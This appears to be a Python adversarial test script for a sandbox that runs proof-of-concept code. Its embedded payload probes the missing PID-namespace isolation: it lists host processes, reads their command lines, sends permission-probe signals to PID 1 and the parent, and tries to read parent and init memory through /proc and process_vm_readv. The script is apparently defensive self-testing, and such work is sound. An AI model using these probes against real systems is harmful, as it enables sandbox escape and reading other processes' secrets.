#!/usr/bin/env python3
"""ATTACK C -- the dropped --unshare-pid. The PoC shares the PID namespace with the
bootstrap+listener (and, since pid-ns is the HOST pid-ns here, with EVERY host
process). Probe: (i) can the PoC see/signal/kill the listener or host procs?
(ii) can it read process memory (ptrace_scope=1)? (iii) can it subvert the verdict?"""
import os, sys, tempfile
sys.path.insert(0, "/tmp/p13_adv_wt")
from ngv2.poc_runner_live import run_jailed_poc_with_loopback

POC = r'''
import os, glob, signal, ctypes, struct
out=[]
def log(*a): out.append(" ".join(str(x) for x in a))

# What PID namespace are we in? (host or jail-private)
log("MY_PIDNS", os.readlink("/proc/self/ns/pid"))
pids=sorted([int(p) for p in os.listdir("/proc") if p.isdigit()])
log("VISIBLE_PID_COUNT", len(pids))
log("PID_RANGE", pids[0], "..", pids[-1])

# (i) Can we identify and signal the listener / parent / host procs?
# Find the bootstrap parent (our ppid) and try to read other procs' cmdlines.
log("MY_PID", os.getpid(), "PPID", os.getppid())
readable=0; sample=[]
for pid in pids[:40]:
    try:
        cl=open("/proc/%d/cmdline"%pid,"rb").read().replace(b"\x00",b" ").decode("utf-8","replace").strip()
        readable+=1
        if cl and len(sample)<6: sample.append((pid, cl[:60]))
    except OSError: pass
log("CMDLINES_READABLE_OF_FIRST_40", readable)
log("CMDLINE_SAMPLE", sample)

# Try to SIGKILL a host process (e.g. our grandparent chain / pid 1). Expect EPERM
# because we are root-in-USERNS only, not host-root; host procs owned by host uids.
for tgt in (1, os.getppid()):
    try:
        os.kill(tgt, 0)  # signal 0 = permission probe
        log("CAN_SIGNAL", tgt, "YES")
    except OSError as e:
        log("CAN_SIGNAL", tgt, "NO", e.errno)

# (ii) ptrace_scope=1 memory read. Try /proc/<pid>/mem on the parent + a host proc.
def try_mem(pid):
    try:
        fd=os.open("/proc/%d/mem"%pid, os.O_RDONLY)
        os.lseek(fd, 0, os.SEEK_SET)
        try:
            data=os.read(fd, 16); os.close(fd); return "READ_OK len=%d"%len(data)
        except OSError as e:
            os.close(fd); return "READ_FAIL errno=%d"%e.errno
    except OSError as e:
        return "OPEN_FAIL errno=%d"%e.errno
log("PARENT_MEM", os.getppid(), try_mem(os.getppid()))
log("PID1_MEM", try_mem(1))
# read maps (info disclosure even without mem)
def try_maps(pid):
    try:
        d=open("/proc/%d/maps"%pid).read(); return "MAPS_OK lines=%d"%len(d.splitlines())
    except OSError as e: return "MAPS_FAIL errno=%d"%e.errno
log("PARENT_MAPS", try_maps(os.getppid()))
log("PID1_MAPS", try_maps(1))

# (iii) process_vm_readv against the parent (the listener lives in the parent proc!)
libc=ctypes.CDLL("libc.so.6", use_errno=True)
class iovec(ctypes.Structure):
    _fields_=[("iov_base",ctypes.c_void_p),("iov_len",ctypes.c_size_t)]
buf=ctypes.create_string_buffer(64)
local=iovec(ctypes.cast(buf,ctypes.c_void_p), 64)
remote=iovec(ctypes.c_void_p(0x400000), 64)
n=libc.process_vm_readv(os.getppid(), ctypes.byref(local),1, ctypes.byref(remote),1, 0)
log("PROCESS_VM_READV_PARENT", "n=%d"%n, "errno=%d"%ctypes.get_errno() if n<0 else "BYTES_READ")

print("__ADV_C__")
for l in out: print(l)
'''
with tempfile.TemporaryDirectory(prefix="advC-") as tmp:
    wd=os.path.join(tmp,"w");os.makedirs(wd)
    pp=os.path.join(wd,"poc.py");open(pp,"w").write(POC)
    res=run_jailed_poc_with_loopback(["python3",pp],repo_root=None,work_dir=wd,extra_ro=[],
        child_env={"PATH":"/usr/bin:/bin:/usr/local/bin","HOME":"/tmp","LANG":"C.UTF-8"},
        timeout_s=30.0,fs_signature="",callback_env_keys=("NGV2_SSRF_CALLBACK",),poc_path=pp)
    print(res.get("stdout"))
    print("STDERR:",(res.get("stderr") or "")[:500])
